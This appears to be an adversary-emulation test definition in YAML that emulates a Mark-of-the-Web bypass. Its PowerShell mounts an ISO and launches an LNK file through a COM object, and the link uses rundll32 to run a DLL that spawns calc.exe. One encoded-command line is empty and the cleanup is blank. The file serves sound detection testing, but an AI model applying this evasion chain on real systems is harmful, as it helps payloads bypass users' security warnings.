- id: 56722c27-fdc5-5e06-a6cf-873e0b7ca86f
  name: Soumaia ART Tests - Execute LNK file from ISO
  description: Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.
  tactic: defense-impairment
  technique:
    attack_id: T1553.005
    name: 'Subvert Trust Controls: Mark-of-the-Web Bypass'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEEAbABsAFQAaABlAFQAaABpAG4AZwBzAC4AaQBzAG8AIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          Mount-DiskImage -ImagePath ".\AllTheThings.iso" -StorageType ISO -Access ReadOnly
          $keep = Get-Volume -FileSystemLabel "AllTheThings"
          $driveLetter = ($keep | Get-Volume).DriveLetter
          $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"))
          $instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
        cleanup: |-
